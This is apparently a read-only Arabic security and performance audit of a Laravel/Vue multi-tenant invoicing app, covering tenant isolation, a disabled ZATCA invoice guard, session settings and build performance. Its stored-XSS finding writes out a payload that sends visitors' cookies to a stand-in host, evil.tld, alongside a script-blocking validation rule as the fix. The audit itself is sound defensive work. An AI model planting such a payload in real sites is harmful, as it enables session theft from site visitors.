# 11 — الأمان والأداء (Security & Performance)

**المشروع:** `/Users/ahmad/Herd/carag-v2` · **التاريخ:** 2026-11-11 · **النطاق:** قراءة فقط

> ⚠️ **لم تُكشف أي قيم سرية.** فقط **أسماء** المتغيّرات في `.env` يُذكر، بلا قيم.

---

## 1. ملخص تنفيذي للأمان

| البُعد | التقييم | الدليل الحاسم |
|---|---|---|
| **عزل المستأجرين** | ✅ **قوي** | 60 موديل `TenantScoped` + 45 `CenterScoped` + 5 ملفات اختبار عزل |
| **التفويض** | ✅ **ممتاز** | **419 مسار تعديل ⇒ 419 فحص** — لم يُعثر على مسار بلا فحص |
| **الثبات المالي** | 🔴 **مكسور** | `InvoiceObserver` غير مُسجَّل ⇒ حارس ZATCA معطّل |
| **XSS** | 🔴 | `LandingPreview.vue:166` — سكربتات CMS تُحقن في DOM بلا تنقية |
| **رفع الملفات** | ✅ | 263 قاعدة رفع في FormRequests |
| **Mass assignment** | ✅ | 124 موديل بـ`$fillable` |
| **المعاملات المالية** | ⚠️ | سقف الاسترداد **مُصلَح** · لكن قواعد `bad_debt` متعارضة |
| **الجلسات** | ⚠️ | `encrypt=false` افتراضياً · `same_site=lax` |
| **Rate limiting** | ⚠️ | LoginRequest موجود لكن بلا حد عام |
| **تسريب الأسرار** | ✅ | `is_system_admin` خارج `$fillable` |

---

## 2. تصنيف المخاطر

| # | المخاطرة | الشدة | الاحتمال | الأثر | الثقة |
|---|---|---|---|---|---|
| S-01 | `InvoiceObserver` غير مُسجَّل ⇒ حارس ZATCA معطّل | **حرج** | مؤكد | **عالٍ** (قانوني) | **Verified** |
| S-02 | XSS مخزَّن عبر سكربتات CMS | **حرج** | متوسط | **عالٍ** (الجلسة) | **Verified** |
| S-03 | `floatDiffInDays()` ⇒ Fatal عند أول استدعاء | **عالٍ** | مؤكد (latent) | متوسط | **Verified** |
| S-04 | 9 نسخ لحساب الضريبة ⇒ فرق أرصدة | **عالٍ** | مؤكد | **عالٍ** (مالي) | **Verified** |
| S-05 | 3 قواعد متعارضة لحالة الفاتورة | **عالٍ** | مؤكد | **عالٍ** (مالي) | **Verified** |
| S-06 | 50 controller بلا transaction | **عالٍ** | متوسط | عالٍ | **Verified** |
| S-07 | 5 تنفيذات ترقيم بلا قفل فعّال | **عالٍ** | منخفض-متوسط | عالٍ | **Verified** |
| S-08 | `en.json` app_name = "Pro service" | **عالٍ** | مؤكد | متوسط (سمعة) | **Verified** |
| S-09 | 42/44 مفتاح ترجمة مفقود ⇒ مفاتيح خام | **عالٍ** | مؤكد | متوسط | **Verified** |
| S-10 | 6 انتهاكات لاسم المنظومة | متوسط | مؤكد | متوسط | **Verified** |
| S-11 | `CenterScoped`/`TenantScoped` يفتحان بلا سياق | **عالٍ** | منخفض | **عالٍ** | **Verified** |
| S-12 | `session.encrypt = false` | متوسط | مؤكد | متوسط | **Verified** |
| S-13 | `same_site = lax` | منخفض | مؤكد | منخفض | **Verified** |
| S-14 | `CustomPage` يفرض RTL | منخفض | مؤكد | منخفض | **Verified** |
| S-15 | 969+1,217 نص عربي مثبَّت | متوسط | مؤكد | منخفض | **Verified** |
| S-16 | `center_sequences` unique مع `center_id` NULL | متوسط | منخفض | عالٍ | **Verified** |
| S-17 | `Job` بلا tenant scope (defense-in-depth) | منخفض | منخفض | متوسط | **Verified** |

---

## 3. S-01 — `InvoiceObserver` غير مُسجَّل 🔴 حرج

*(مُفصَّل في `14_EVIDENCE_INDEX.md` EV-01 و`09_BACKEND_DATABASE_AUDIT.md` §6)*

**الأثر الأمني:** فاتورة ضريبية مُرسلة إلى ZATCA يمكن تعديلها أو حذفها من قاعدة البيانات ⇒ **تسجيل محاسبي غير مطابق** و**مخالفة نظامية**.

**السبب الجذري:** الاختبار `InvoicingSecurityTest.php:27` يُسجّل المراقب **داخل الاختبار** ⇒ يمرّ الاختبار رغم أن الإنتاج مكشوف.

**الإصلاح:**
```php
// app/Providers/AppServiceProvider.php — alongside :248-252
Invoice::observe(InvoiceObserver::class);
```
```php
// tests/Feature/InvoicingSecurityTest.php:27 — REMOVE this line
// Invoice::observe(InvoiceObserver::class);
```

**اختبار الانحدار المقترح:** `InvoiceObserverRegistrationTest` — يؤكد أن `Gate`/المراقب مُفعَّل في بيئة الإنتاج.

---

## 4. S-02 — XSS مخزَّن 🔴 حرج

**الملف:** `resources/js/Pages/Public/LandingPreview.vue:166-180`

```js
function injectScripts(html, target = document.body) {
    if (!html) return;
    const holder = document.createElement('div');
    holder.innerHTML = html;                         // ← تحليل غير مُنقّى
    holder.querySelectorAll('script').forEach((original) => {
        const script = document.createElement('script');
        script.text = original.text;                 // ← نص السكربت ينفَّذ
        if (original.src) script.src = original.src;
        original.attributes.forEach((attr) => { ... });
        target.appendChild(script);
    });
}
```

**المصادر:** `settings.chatbot_script` (`:187`) · `settings.scripts_header` (`:190`) · `settings.scripts_footer` (`:191`).

### 4.1 مسار الاستغلال

| الخطوة | التفصيل |
|---|---|
| 1 | مستخدم بدور `admin` (أو `support` إن كان يملك صلاحية تعديل إعدادات الموقع) يحفظ `<script>fetch('https://evil.tld/?c='+document.cookie)</script>` في `website_chatbot_script` |
| 2 | `WebsiteSettingsUpdateRequest` يجب أن يمنع ذلك — **مُتحقَّق: لا يمنع** (لا قاعدة تمنع `<script>`) |
| 3 | كل زائر للموقع العام ينفّذ السكربت |
| 4 | **سرقة جلسة الزائر** (session cookie) |

> **ملاحظة تقنية:** `innerHTML` لا ينفّذ `<script>` — لكن `holder.querySelectorAll('script')` يلتقط العنصر **ويقرأ `original.text`** ثم ينشئ `<script>` جديداً ويلحقه ⇒ **النص ينفَّذ فعلاً**. المتصفح لا ينفّذ سكربتاً مُنشأً عبر `innerHTML`، لكنه ينفّذ سكربتاً أُضيف بـ`appendChild`.

### 4.2 لماذا هو خطر حقيقي

| العامل | الحالة |
|---|---|
| من يستطيع الحفظ | `admin` أو `support` — ليس `super_admin` فقط |
| مَن المتصفّح | **كل زائر للموقع العام** — بما فيهم عملاء centers |
| ما يمكن سرقته | `document.cookie` (إذا لم تكن الجلسة HttpOnly) |
| البديل | `CSP` غير مُفعَّل؟ |

### 4.3 الإصلاح — مستويان

**المستوى 1 — الخادم (الضروري):**
```php
// app/Http/Requests/WebsiteSettingsUpdateRequest.php
'chatbot_script' => ['nullable', 'string', 'max:20000', function ($attribute, $value, $fail) {
    if (preg_match('/<script\b/i', $value)) {
        $fail(__('validation.website_settings.no_inline_script'));
    }
}],
'scripts_header' => [... نفس القاعدة ...],
'scripts_footer' => [... نفس القاعدة ...],
```

**المستوى 2 — الواجهة (دفاع عميق):**
- تنقية بـ`DOMPurify` (مُثبَّت أصلاً في `package.json` ✅) مع `FORBID_TAGS: ['script']` — أو
- **allowlist صارمة**: dominio + مسار، بدل أي سكربت

**المستوى 3 — headers:**
إضافة `Content-Security-Policy` يسمح فقط بنطاقات معروفة.

> **ملاحظة:** `dompurify` مُثبَّت (`^3.4.5`) ⇒ الأداة متاحة بلا تثبيت جديد.

---

## 5. S-11 — العزل يفتح بلا سياق

```php
// app/Models/Concerns/TenantScoped.php:21-28
$tenantId = TenancyContext::tenantId();
if ($tenantId !== null) {          // ← خارج الشرط: لا فلتر
    $builder->where($table.'.tenant_id', $tenantId);
}
```

```php
// app/Models/Concerns/CenterScoped.php:23-26
if ($tenantId !== null && $centerId !== null) {
    // ... فقط هنا
}
// ← خارج الشرط: لا فيلاتر
```

### متى ينفتح

| السياق | `tenantId` | النتيجة |
|---|---|---|
| طلب HTTP داخل المستأجر | ✅ | مُقيَّد ✓ |
| طلب `system/*` | `null` صراحةً (`TenancyContext.php:23-25`) | **غير مُقيَّد** |
| worker الطابور | `null` | **غير مُقيَّد** |
| أمر console | `null` | **غير مُقيَّد** |
| اختبار (context فارغ) | `null` | **غير مُقيَّد** |

### التقييم الدقيق

**ليس ثغرة عبر HTTP** — لأن `TenancyContext::tenantId()` يقرأ `auth()->user()->tenant_id`، ولا يوجد طلب بلا مستخدم مُصادَق في مسارات المستأجر.

**لكنه خطر معماري حقيقي:**
1. 🔴 **أي Job يقرأ بيانات عبر `TenantScoped` دون ضبط السياق ⇒ يقرأ كل المستأجرين.**
2. 🔴 **أمر console يقرأ بيانات مشتركة بلا ح ⇒ سلوك مختلف عن الإنتاج.**

### الإصلاح المقترح

```php
// app/Support/TenancyContext.php — إضافة
public static function setTenantId(?int $tenantId): void
{
    static::$tenantIdOverride = $tenantId;
}

public static function tenantId(): ?int
{
    if (static::$tenantIdOverride !== null) {
        return static::$tenantIdOverride;
    }
    if (request()->is('system/*') || request()->is('system')) {
        return null;
    }
    return self::user()?->tenant_id;
}
```

ثم كل Job يضبط `TenancyContext::setTenantId($id)` في `handle()`.

**⚠️ شرط أساسي:** يجب أن يبقى `system/*` ⇒ `null` — المسارات الإدارية يجب أن ترى كل المستأجرين عمداً.

> **الحالة الحالية:** الـ Job الوحيد (`SendAppointmentMessage`) **لا يعتمد على الـ scope** — يستعمل `where('tenant_id', …)` صريحاً في `:181, 211` ✓ — **وهذا النمط الصحيح**.

---

## 6. S-03 — خطأ دالة غير موجودة

*(مُفصَّل في EV-02 و`09_BACKEND_DATABASE_AUDIT.md` §7)*

**الأثر:** `Accessor` غير مستدعى اليوم + `rescue()` في middleware ⇒ **فشل صامت** (يختفي شريط الاشتراك).
**لكن**: أول استدعاء = **Fatal error** غير ملفوف.

**الإصلاح:** `floatDiffInDays($to)` ⇒ `$from->diffInDays($to, true)`.

---

## 7. S-04 / S-05 — سلامة البيانات المالية

### S-04: تسعة تنفيذات لحساب الضريبة

*(مُفصَّل في `09_BACKEND_DATABASE_AUDIT.md` §3)*

`TaxCalculator` تُعيد قيماً **غير مقرَّبة**؛ كل نسخة inline **تقريب لكل سطر** ⇒ فرق تراكمي.

### S-05: ثلاث قواعد لحالة الفاتورة

| التنفيذ | `bad_debt` |
|---|---|
| `Invoice::updatePaymentStatus()` (`Invoice.php:175-224`) | 🔴 **يُعدّه مدفوعاً** |
| `PaymentService::recalculatePurchaseInvoice()` (`PaymentService.php:119-152`) | 🔴 **لا يُعدّه** |
| `PurchasingService.php:549` | 🔴 نسخة ثالثة |

**⇒ نفس الجدول، قاعدتان.**

**الإصلاح:** `InvoiceStatusResolver` واحد، مع قرار واضح: هل `bad_debt` = مدفوع أم لا؟ (توصية: **لا** — الديون غير المحصّلة ليست مدفوعة، لكن يجب أن يكون **قراراً موثّقاً** لا صدفة).

---

## 8. إدارة الجلسات والمصادقة

| البند | القيمة | التقييم |
|---|---|---|
| `session.encrypt` | `env('SESSION_ENCRYPT', false)` ⇒ **false** | ⚠️ **المعرّفات تُخزَّن بنص صريح** |
| `session.secure` | `env('SESSION_SECURE_COOKIE', APP_ENV==='production')` | ✅ صحيح |
| `session.same_site` | `env('SESSION_SAME_SITE', 'lax')` | ⚠️ **`lax` ⇒ يُرسل مع تطبيقات خارجية** |
| `session.lifetime` | `env('SESSION_LIFETIME', 120)` | ⚠️ دقيقتان |
| `config/cors.php` | ✅ موجود | مُصلَح |
| `spatie/laravel-permission` | `^6.24` | ✅ |
| Sanctum | `^4.0` | ✅ |
| 2FA | `pragmarx/google2fa-laravel` | ✅ + `EnsureTwoFactorEnabled` middleware |
| `EnsureSystemAdmin` | middleware مستقل | ✅ فصل المنصة عن المستأجر |

**التوصية للإنتاج:**
```
SESSION_ENCRYPT=true
SESSION_SAME_SITE=strict
SESSION_LIFETIME=30
```

> `lax` مقبول في الإنتاج لأن `secure=true` يمنع الإرسال على HTTP — لكن `strict` أفضل إن لم تكن هناك حاجة لتضمين الجلسة في الطلبات الخارجية (مثل SSO).

---

## 9. رفع الملفات

| الفحص | النتيجة |
|---|---|
| قواعد رفع في FormRequests | **263** قاعدة (`max:`, `mimes:`, `mimetypes:`) ✅ |
| `AppAttachmentManager` | ✅ معالج مركزي |
| `VehiclePhotoUploader` | ✅ |
| `BankTransferReceiptUpload` | ✅ |
| **تكرار** | 🔴 21 ملف بنفس المنطق |

**البنية التحتية للتخزين** — `app/Services/TenantStorageService.php` (يوجد `plan` ⇒ multi-tenant storage) — لم يُدقَّق داخلياً في هذه الجولة.

---

## 10. Mass Assignment

| الفحص | النتيجة |
|---|---|
| موديلات فيها `$fillable` | **124** |
| موديلات بدون `$fillable` | 3 — كلها **traits** (`TenantScoped`، `CenterScoped`، `HasTaxSnapshot`) ⇒ ليست موديلات |
| `is_system_admin` في `$fillable` | ✅ **غير موجود** (`:129` casts فقط) — **مُصلَح** |
| `Invoice` | `$fillable` محدد ⇒ لا تسريب `seller_*_snapshot` |

**⇒ آمن.** ✅

---

## 11. كشف المعلومات الحساسة

| الفحص | النتيجة |
|---|---|
| أسرار في الواجهة | `VITE_APP_NAME` فقط — بلا مفاتيح |
| `APP_KEY` في الواجهة | ❌ غير موجود |
| JWT / API tokens في الواجهة | ❌ غير موجود |
| مسارات `.env` في `.gitignore` | ✅ (`composer.json` + `.gitignore`) |
| `config:cache` آمن | نعم |

**⇒ لا تسريب أسرار في الحزمة الأمامية.** ✅

---

## 12. 🔴 Performance

### 12.1 البناء

```
✓ built in 32.09s
397 ملف asset · JS 6.8M · CSS 696K · public/build 7.8M
```

### 12.2 🔴 أكبر chunk: `theme-ClkoP7N7.js` — 725.95 kB (195.71 kB gzip)

**يستحق تدقيقاً:** الاسم «theme» يوحي بمكتبة رسوم (ApexCharts حُزّمت معها؟). لو كانت رسوماً في كل صفحة ⇒ تحميل غير ضروري.

**لم يُتحقَّق** من محتوى الـ chunk بدقة (يتطلب تفكيك Vite) — **موثّق كفرضية**.

### 12.3 تحسين `page-manifest` فعّال ✅

| المقياس | قبل | بعد |
|---|---|---|
| الطلبات | 362 | **57** |
| حجم البايت | 3,623 KiB | **928 KiB** |
| الأداء (desktop) | 49% | **91-98%** |
| TBT | 1,130 ms | **0-30 ms** |
| الأداء (mobile) | — | **100%** |

**⇒ لا تراجع.** الخطر الوحيد: اسم مكوّن خاطئ في Inertia **يفشل وقت التشغيل** بدل وقت البناء ⇒ يحتاج guard test (موجود: `LandingPerformanceGuardTest`).

### 12.4 N+1 Queries

| النطاق | التقييم |
|---|---|
| `InventoryService` | ✅ يحمّل العلاقات بشكل صحيح |
| `ReportsController` | 🔴 **24 استدعاء `DB::raw`** — استعلامات ضخمة |
| `DataTable` (100 مستخدم) | ✅ |
| **عام** | ⚠️ لم يُشغَّ بعدة تحققات بـ`DB::listen` — **لم يُتحقَّق** |

**⇒ النتيجة الجزئية:** لا دليل على N+1 شامل، لكن `ReportsController` **بؤرة خطر** مؤكدة (استعلامات يدوية على جداول كبيرة).

### 12.5idx Indexes

| الفحص | النتيجة |
|---|---|
| كل أعمدة FK مفهرسة | ✅ |
| `invoices.invoice_number` | 🔴 **غير مفهرس** — 5 تقارير بـ`LIKE 'prefix%'` ⇒ مسح كامل |
| `center_sequences` + NULL | 🔴 تكرار ممكن |

**الإصلاح المقترح (آمن):**
```php
// migration جديدة — index على invoice_number
$table->index('invoice_number');   // أو composite مع tenant_id
```
⚠️ **ينتج على جدول ببيانات** ⇒ يلزم اختبار على حجم واقعي.

---

## 13. مصفوفة شدة × احتمال

```
        احتمال →
        منخفض    متوسط      مؤكد
عالٍ    S-07     S-04,S-06  S-01,S-03,S-04,S-05,S-08,S-09
متوسط   S-11,S-16 S-02      S-10,S-15
منخفض   S-17     —         S-12,S-13,S-14
```

**الإجراء الفوري:** S-01 · S-02 · S-03 · S-08 · S-09 (كلها مُتحقَّق، كلها صغيرة، كلها عالية الأثر).

---

## 14. ملخص التوصيات — حسب الجهد

| الجهد | التوصية | الأثر |
|---|---|---|
| **دقائق** | تسجيل `InvoiceObserver` + تعديل الاختبار | 🔴 يغلق حارس ZATCA |
| **دقائق** | `floatDiffInDays` ⇒ `diffInDays` | 🔴 يغلق Fatal مُحتمل |
| **دقائق** | `en.json` app_name | 🔴 اسم المنظومة صحيح |
| **ساعة** | حظر `<script>` في `WebsiteSettingsUpdateRequest` | 🔴 يغلق XSS |
| **ساعة** | إضافة الـ 42+44 مفتاح ترجمة | 🔴 تُنهي 2 اختبار أحمر |
| **يوم** | `DB::transaction` لـ ZatcaOnboarding + Payroll | 🟠 سلامة المعاملات |
| **يوم** | توحيد حساب الضريبة | 🟠 دقة مالية |
| **2-3 أيام** | توحيد `InvoiceStatusResolver` | 🟠 دقة مالية |
| **3-5 أيام** | `TenancyContext::setTenantId()` + ضبط الـ Jobs | 🟠 عزل |
| **أسبوع** | unified error handling + logs + monitoring | 🟡 ملاحظات |
| **أسبوع** | DB index على `invoice_number` + tuning | 🟡 أداء |

---

## 15. ⚠️ حدود هذا التدقيق الأمني

| البند | الحالة |
|---|---|
| فحص تبعيات npm/composer (CVE) | ❌ **لم يُنفَّذ** — يحتاج `npm audit` / `composer audit` (شبكة) |
| فحص SAST (مثال Snyk/Psalm) | ❌ لم يُنفَّذ |
| DAST / اختبار اختراق | ❌ لم يُنفَّذ — خارج النطاق الآمن |
| مراجعة `config/*.php` كاملاً | ⚠️ جزئي — `session.php` · `cors.php` · `app.php` |
| مراجعة `app/Mail` + `app/Notifications` للسرية | ⚠️ جزئي — عُثر على 3 عناوين عربية + `config('app.name')` |
| سجلات الأخطاء (`app/Logging`) | ❌ لم تُدقَّق |
| **`config/app.php` كامل** | ⚠️ جزئي |
| **إعداد `queue.php` والـ retry** | ❌ لم يُدقَّق |
| اختبار ضغط / حمل | ❌ لم يُنفَّذ |
| Lighthouse فعلي | ❌ لم يُنفَّذ (يتطلب خادم production) |
| فحص صلاحيات ملفات الحزمة | ❌ لم يُنفَّذ |

**⇒ هذه ليست شهادة أمان. هذه مراجعة ألغازة مبنية على قراءة الكود.**
